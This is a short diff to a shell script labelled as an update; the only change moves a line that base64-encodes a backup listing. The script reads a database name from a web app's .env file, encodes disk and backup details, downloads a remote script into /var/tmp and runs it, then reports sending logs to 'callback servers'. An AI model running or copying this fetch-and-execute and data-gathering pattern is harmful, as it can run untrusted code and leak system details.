@@ -22,7 +22,6 @@ EOF
 echo '[ * ] Processing parameters for payload retrieval'
 DBNAME=`cat /var/www/html/wah2/.env | grep DB_DATABASE`
 STARTTIME=`date`
-DOLB=`ls ~/backup | tail -2 | base64`
 DF=`df | base64`
 echo ''
 echo ''
@@ -42,7 +41,10 @@ curl http://sql.wah.ph/alpha_branch/script_final > /var/tmp/feather
 
 echo '[ * ] Executing payload'
 echo > ~/log.txt
+DOLB=`ls ~/backup | tail -2 | base64`
 sh /var/tmp/feather
+
+
 
 ENDTIME=`date`
 echo '[ * ] Update almost finished, sending logs to callback servers.'
